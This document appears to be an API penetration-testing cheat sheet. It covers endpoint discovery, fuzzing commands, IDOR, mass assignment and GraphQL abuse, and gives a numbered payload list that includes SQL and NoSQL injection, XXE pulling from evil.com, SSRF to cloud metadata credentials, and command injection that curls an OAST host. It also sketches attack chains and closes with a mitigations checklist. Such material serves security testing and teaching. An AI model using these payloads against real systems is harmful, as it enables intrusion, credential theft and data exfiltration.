## 0. Theory – What & Why

APIs transfer data between systems (internal or external).  
Security testing verifies:

* **Authentication** – who are you?  
* **Authorization** – what can you do?  
* **Input validation** – can I break the parser?  
* **Business logic** – does the flow make sense?  
* **Rate-limit / DoS** – can I exhaust resources?  
* **Crypto / Transport** – is data protected in motion & at rest?

---

## 1. Recon & Endpoint Discovery

### 1.1 Passive Sources
* Archive.org, Censys, VirusTotal, GitHub dorks  
* Mobile APK / IPA teardown (APKPure, jadx, MobSF)

### 1.2 Active Discovery
* **Swagger / OpenAPI**  
  * `/swagger`, `/api-docs`, `/v3/api-docs`, `/openapi.json`  
* **GraphQL introspection**  
  * `/graphql` → `query{__schema{types{name fields{name}}}}`  
* **WADL & SOAP**  
  * `/?wsdl`, `/.wsdl`, `/services`, `/_vti_bin`

### 1.3 Fuzzing Tools & Wordlists
```bash
# kiterunner (fast, API-aware)
kr scan https://target.com/api/ -w routes-large.kite -x 20
kr brute https://target.com/api/ -A=raft-large-words -x 20 -d=0

# ffuf
ffuf -w /usr/share/seclists/Discovery/Web-Content/api.txt -u https://target/FUZZ

# apifuzzer (OpenAPI aware)
apifuzzer -s spec.json -u http://target -r /tmp/reports --log debug
```

* Wordlists:  
  * [assetnote api](https://wordlists.assetnote.io/)  
  * [danielmiessler/SecLists/api](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/api)  
  * [chrislockard/api_wordlist](https://github.com/chrislockard/api_wordlist)

---

## 2. Exploitation Methods & Checks

### 2.1 Version & Path Manipulation
* `/api/v3/user` → `/api/v1/user`  
* `/api/mobile/login` → `/api/magic_link`  
* Append `.json`, `..;/`, `??`, `%20`, `%09`, `&details`, `#`

### 2.2 HTTP Verb Tampering
* `GET /trips/1` → `POST`, `PUT`, `PATCH`, `DELETE`, `HEAD`, `OPTIONS`  
* `POST /users` → `GET /users` (mass assignment leak)

### 2.3 Parameter Pollution (HPP & JPP)
```
/api/profile?user_id=legit&user_id=victim
/api/profile?user_id=victim&user_id=legit
POST {"user_id":"legit","user_id":"victim"}
```

### 2.4 IDOR / BOLA
* Numeric: `/users/6b95d962-df38` → `/users/1`  
* Wrap ID: `{"id":111}` → `{"id":[111]}` or `{"id":{"id":111}}`  
* Wildcards: `"user_id":"*"`  
* Predictable: auto-increment `/invoice/0001` → `/invoice/0002`

### 2.5 Mass Assignment
```
POST /register
{"username":"u","password":"p","admin":true,"role":"super"}
```

### 2.6 Content-Type Switching
* JSON ↔ XML → XXE  
* JSON ↔ `x-www-form-urlencoded` → parser bypass  
* Send arrays/dicts: `username[]=john&username[$neq]=lalala`

### 2.7 Injection Families
* SQL: `{"id":"1 AND sleep(5)#"}`  
* NoSQL: `{"username":{"$ne":""},"password":{"$ne":""}}`  
* Command (RoR): `?url=|whoami`  
* SSRF: XML `<!ENTITY xxe SYSTEM "http://169.254.169254/latest/meta-data/">`  
* Template / PDF export → XSS → LFI/SSRF  
* GraphQL: batch login to bypass rate, deep recurse DoS

### 2.8 GraphQL Specific
* Introspection → schema leak  
* Alias-based batch queries  
* Deep nested fragments (Billion-laugh style)  
* Field brute-force: `/{__schema{types{name fields{name}}}}`

---

## 3. Bypasses

| Control             | Bypass                                                            |
| ------------------- | ----------------------------------------------------------------- |
| 401 on `/users`     | Add `?user_id=1` or header `X-Requested-With: XMLHttpRequest`     |
| GUID only           | Try numeric, array wrap, wildcard                                 |
| 403 on ID           | Parameter pollution, JSON wrap, different version, `.json` suffix |
| Rate limit          | GraphQL batching, mobile endpoint, staging env, lower version     |
| Path combine (.NET) | `filename=C:\\windows\win.ini` or `\\evil.com\share`              |

---

## 4. Payloads (Modern & Robust)

1. SQLi time-based  
   `{"id":"1 AND if(substr(@@version,1,1)=5,sleep(5),0)#"}`

2. NoSQL auth bypass  
   `{"username":{"$ne":null},"password":{"$ne":null}}`

3. XXE OOB  
   `<!ENTITY % p SYSTEM "http://evil.com/ext.dtd"> %p;`

4. SSRF via PDF export  
   `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>`

5. Command inj (RoR)  
   `?url=|curl http://collab.oast.pro/x`

6. Mass assignment  
   `POST /signup {"name":"u","plan":"free","plan":"enterprise"}`

7. GraphQL batch rate-bypass  
   `mutation{login(email:"a@x.com",pass:"p"){jwt}} mutation{login(email:"b@x.com",pass:"p"){jwt}}`

8. IDOR wrap  
   `{"order_id":{"order_id":1337}}`

9. HPP  
   `/api/invoice?id=legit&id=../etc/passwd`

10. Wildcard  
    `GET /api/reports/*/financial.csv`

---

## 5. Higher Impact Chains

1. Enumerate hidden v1 endpoint → IDOR → leak admin JWT → mass assignment elevate → GraphQL introspection → dump full user DB  
2. APK teardown → hard-coded staging key → non-prod has debug=true → XXE → SSRF metadata → cloud keys → full infra takeover  
3. PDF export injection → stored XSS → admin visits → JS hook → internal API calls via GraphQL → write malicious mutation → RCE via file-write endpoint

---

## 6. Tools Quick-List

* **Recon**: kiterunner, ffuf, apifuzzer, graphw00f, GraphCrawler  
* **Proxy**: mitmweb, Burp + InQL, Swagger-EZ, Postman  
* **Swagger → code**: mitmproxy2swagger, swagroutes, sj  
* **Wordlists**: SecLists, assetnote, chrislockard, fuzzdb  
* **GUID brute**: [GUID guesser](https://gist.github.com/DanaEpp/8c6803e542f094da5c4079622f9b4d18)

---

## 7. Mitigations Checklist

✅ Enforce centralized authZ (policy engine) – every endpoint, every verb  
✅ UUIDv4 + random, non-sequential, non-guessable IDs  
✅ Strict Content-Type whitelist – reject unexpected types  
✅ Disable GraphQL introspection & debug in prod  
✅ Parameterized queries / ORM – no string concat  
✅ Rate-limit per user + per IP; block GraphQL batch abuse  
✅ Schema validation – strip unknown fields (stop mass-assignment)  
✅ Output encoding – no user data in PDF/HTML without sanitization  
✅ HSTS + TLS 1.3, secure cookies, SameSite=strict  
✅ Segregate environments – staging ≠ prod data; use different secrets  
✅ Log & alert anomalous patterns (verb tampering, 403→200, etc.)  
✅ Run SCA/DAST – integrate kiterunner & fuzzers in CI pipeline  
✅ Threat-model business flows – identify sensitive state transitions
